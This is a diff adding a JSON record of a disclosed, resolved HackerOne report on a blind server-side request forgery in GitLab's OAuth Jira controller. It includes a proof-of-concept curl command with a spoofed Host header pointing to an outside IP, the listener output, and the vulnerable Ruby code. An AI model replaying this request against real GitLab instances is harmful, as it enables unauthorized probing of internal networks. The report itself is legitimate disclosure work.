@@ -1,0 +1,206 @@
+{
+  "id": 398799,
+  "global_id": "Z2lkOi8vaGFja2Vyb25lL1JlcG9ydC8zOTg3OTk=",
+  "url": "https://hackerone.com/reports/398799",
+  "title": "Unauthenticated blind SSRF in OAuth Jira authorization controller",
+  "state": "Closed",
+  "substate": "resolved",
+  "severity_rating": "high",
+  "readable_substate": "Resolved",
+  "created_at": "2018-08-24T03:05:22.400Z",
+  "submitted_at": "2018-08-24T03:05:22.400Z",
+  "is_member_of_team?": false,
+  "is_organization_group_member?": false,
+  "is_triager?": false,
+  "reporter": {
+    "disabled": false,
+    "username": "jobert",
+    "url": "/jobert",
+    "profile_picture_urls": {
+      "small": "https://profile-photos.hackerone-user-content.com/variants/ht4b9SmcYNqmpbyCFXd7cxHB/b8e19a7691128fca51630d7f5b14644b91b3b45324f6fd488e36244d744fe35b"
+    },
+    "is_me?": false,
+    "cleared": false,
+    "verified": false,
+    "hackerone_triager": false,
+    "hacker_mediation": false
+  },
+  "team": {
+    "id": 264,
+    "url": "https://hackerone.com/gitlab",
+    "handle": "gitlab",
+    "profile_picture_urls": {
+      "small": "https://profile-photos.hackerone-user-content.com/variants/f0hovtq73f9ap815a0r1w42bocp4/b8e19a7691128fca51630d7f5b14644b91b3b45324f6fd488e36244d744fe35b",
+      "medium": "https://profile-photos.hackerone-user-content.com/variants/f0hovtq73f9ap815a0r1w42bocp4/89f037b490baf3dcca1b84283f4c85141b64c213252a9c79b56c62bf903ab542"
+    },
+    "permissions": [],
+    "submission_state": "open",
+    "default_currency": "usd",
+    "awards_miles": false,
+    "offers_bounties": true,
+    "state": "public_mode",
+    "only_cleared_hackers": false,
+    "pentest_feature_enabled?": false,
+    "pentest_retesting_ends_at": null,
+    "profile": {
+      "name": "GitLab",
+      "twitter_handle": "gitlab",
+      "website": "https://about.gitlab.com",
+      "about": "A single application for the entire software development lifecycle."
+    }
+  },
+  "has_bounty?": true,
+  "can_view_team": true,
+  "can_view_report": true,
+  "is_external_bug": false,
+  "is_published": false,
+  "is_participant": false,
+  "has_collaborators": false,
+  "submitted_by_team_member": false,
+  "submitted_with_assistant": false,
+  "stage": 4,
+  "public": true,
+  "visibility": "full",
+  "cve_ids": [],
+  "singular_disclosure_disabled": true,
+  "disclosed_at": "2019-03-14T16:28:39.097Z",
+  "bug_reporter_agreed_on_going_public_at": "2019-02-12T16:28:38.692Z",
+  "team_member_agreed_on_going_public_at": null,
+  "comments_closed?": false,
+  "facebook_team?": false,
+  "team_private?": false,
+  "vulnerability_information": "The `Oauth::Jira::AuthorizationsController#access_token` endpoint is vulnerable to a blind SSRF vulnerability. The vulnerability allows an attacker to make arbitrary HTTP/HTTPS requests inside a GitLab instance's network.\n\n# Proof of concept\nTo reproduce the vulnerability, follow the steps below.\n\n - spin up a GitLab EE instance with the latest version (11.2.1-ee)\n - send a `POST` request to the `/-/jira/login/oauth/callback` endpoint, as shown below. In the request, point the `Host` header to the hostname / IP address and port number you want to send the request to:\n\n```\ncurl -X POST -H 'Host: 162.243.147.21:81' 'https://gitlab.com/-/jira/login/oauth/access_token'\n```\n\n - Observe a `POST` request being sent to `162.243.147.21:81` (in this case HTTPS):\n\n```\nListening on [0.0.0.0] (family 0, port 81)\nConnection from [35.231.137.154] port 81 [tcp/*] accepted (family 2, sport 58558)\n��ؒ����\n��/$����4�i�,�֟J%>�+�/�,�0�����#�'�\t��$�(�\n�gk39@j28��<=/5�l162.243.147.21\n\n Connection closed, listening again.\n```\n\n# Vulnerable code\nThe following code can be found in the `Oauth::Jira::AuthorizationsController#access_token` method.\n\n```ruby\ndef access_token\n  auth_params = params\n                  .slice(:code, :client_id, :client_secret)\n                  .merge(grant_type: 'authorization_code', redirect_uri: oauth_jira_callback_url)\n\n  auth_response = Gitlab::HTTP.post(oauth_token_url, body: auth_params, allow_local_requests: true)\n  token_type, scope, token = auth_response['token_type'], auth_response['scope'], auth_response['access_token']\n\n  render text: \"access_token=#{token}&scope=#{scope}&token_type=#{token_type}\"\nend\n```\n\nThe `GItlab::HTTP.post` call is using the `oauth_token_url` directly. This `_url` Rails routing helper uses the `Host` header to construct the URL it needs to point to. Because every host is accepted in GitLab, the constructed URL can point to an internal system. This is how it's supposed to work. However, the `Host` header should be checked before making the `post` call to avoid an attacker being able to make arbitrary requests.\n\n## Impact\n\nThe response of the server is actually interpreted, but this is limited to a JSON response that returns an `access_token`, `scope`, and `token_type`. However, this may have additional consequences in case there are unauthenticated endpoints within the instance's network. This isn't very likely, which is why the attack complexity is set to High. It has a minor impact on Availability, because a thread is blocked on the TCP read timeout, which is set to 60 seconds (`curl -X POST -H 'Host: 162.243.147.21:81'   0.03s user 0.01s system 0% cpu 1:00.76 total`). The integrity impact is currently set at High, but this depends on additional factors, such as what other internal services can be hit. The user does not need to be authenticated to execute the call.",
+  "bounty_amount": "4000.0",
+  "formatted_bounty": "$4,000",
+  "weakness": {
+    "id": 68,
+    "name": "Server-Side Request Forgery (SSRF)"
+  },
+  "original_report_id": null,
+  "original_report_url": null,
+  "attachments": [],
+  "allow_singular_disclosure_at": "2019-03-14T16:28:38.859Z",
+  "allow_singular_disclosure_after": -230908079.85943434,
+  "singular_disclosure_allowed": true,
+  "vote_count": 237,
+  "voters": [
+    "he4am",
+    "loaymorad",
+    "orange303",
+    "arist0phanes",
+    "notpwnguy",
+    "p1stachios",
+    "badcracker",
+    "mashoud1122",
+    "sklnhunt",
+    "base_64",
+    "and 227 more..."
+  ],
+  "severity": {
+    "rating": "high",
+    "score": 7.5,
+    "author_type": "User",
+    "metrics": {
+      "attack_vector": "network",
+      "attack_complexity": "high",
+      "privileges_required": "none",
+      "user_interaction": "none",
+      "scope": "changed",
+      "confidentiality": "none",
+      "integrity": "high",
+      "availability": "low"
+    }
+  },
+  "structured_scope": null,
+  "abilities": {
+    "assignable_team_members": [],
+    "assignable_team_member_groups": []
+  },
+  "is_exploit_agent_supported?": false,
+  "is_linear_agent_ui_supported?": false,
+  "summaries": [
+    {
+      "category": "team",
+      "can_view?": true,
+      "can_create?": false
+    },
+    {
+      "category": "researcher",
+      "can_view?": true,
+      "can_create?": false
+    }
+  ],
+  "databaseId": "398799",
+  "votes": 237,
+  "latest_disclosable_activity_at": "2019-03-14T16:28:39.127Z",
+  "_metadata": {
+    "saved_at": "2026-07-08T13:36:38.832098",
+    "source": "https://hackerone.com/reports/398799.json",
+    "report_id": 398799
+  },
+  "_graphql_detail": {
+    "id": "Z2lkOi8vaGFja2Vyb25lL1JlcG9ydC8zOTg3OTk=",
+    "databaseId": "398799",
+    "title": "Unauthenticated blind SSRF in OAuth Jira authorization controller",
+    "url": "https://hackerone.com/reports/398799",
+    "state": null,
+    "substate": "resolved",
+    "disclosed_at": "2019-03-14T16:28:39.097Z",
+    "created_at": "2018-08-24T03:05:22.400Z",
+    "submitted_at": null,
+    "weakness": {
+      "id": "Z2lkOi8vaGFja2Vyb25lL1dlYWtuZXNzLzY4",
+      "name": "Server-Side Request Forgery (SSRF)",
+      "external_id": "cwe-918"
+    },
+    "severity": {
+      "rating": "high",
+      "score": 7.5
+    },
+    "reporter": {
+      "username": "jobert"
+    },
+    "team": {
+      "id": "Z2lkOi8vaGFja2Vyb25lL0VuZ2FnZW1lbnRzOjpCdWdCb3VudHlQcm9ncmFtLzI2NA==",
+      "handle": "gitlab",
+      "name": "GitLab",
+      "url": "https://hackerone.com/gitlab",
+      "currency": "usd"
+    },
+    "bounties": {
+      "edges": [
+        {
+          "node": {
+            "id": "Z2lkOi8vaGFja2Vyb25lL0JvdW50eS8xMDQzMzI=",
+            "amount": "4000.00",
+            "awarded_amount": "4000.00",
+            "awarded_bonus_amount": "0.00",
+            "created_at": "2018-10-11T03:08:55.074Z"
+          }
+        }
+      ]
+    }
+  },
+  "_hacktivity": {
+    "__typename": "HacktivityDocument",
+    "id": "Z2lkOi8vaGFja2Vyb25lL0NvbXBsZXRlSGFja3Rpdml0eVJlcG9ydEluZGV4LzM5ODc5OQ==",
+    "_id": "398799",
+    "disclosed": true,
+    "votes": 237,
+    "latest_disclosable_activity_at": "2019-03-14T16:28:39.127Z",
+    "report": {
+      "id": "Z2lkOi8vaGFja2Vyb25lL1JlcG9ydC8zOTg3OTk=",
+      "databaseId": "398799",
+      "title": "Unauthenticated blind SSRF in OAuth Jira authorization controller",
+      "url": "https://hackerone.com/reports/398799",
+      "disclosed_at": "2019-03-14T16:28:39.097Z"
+    },
+    "team": {
+      "id": "Z2lkOi8vaGFja2Vyb25lL0VuZ2FnZW1lbnRzOjpCdWdCb3VudHlQcm9ncmFtLzI2NA==",
+      "handle": "gitlab",
+      "name": "GitLab",
+      "url": "https://hackerone.com/gitlab",
+      "currency": "usd"
+    }
+  }
+}
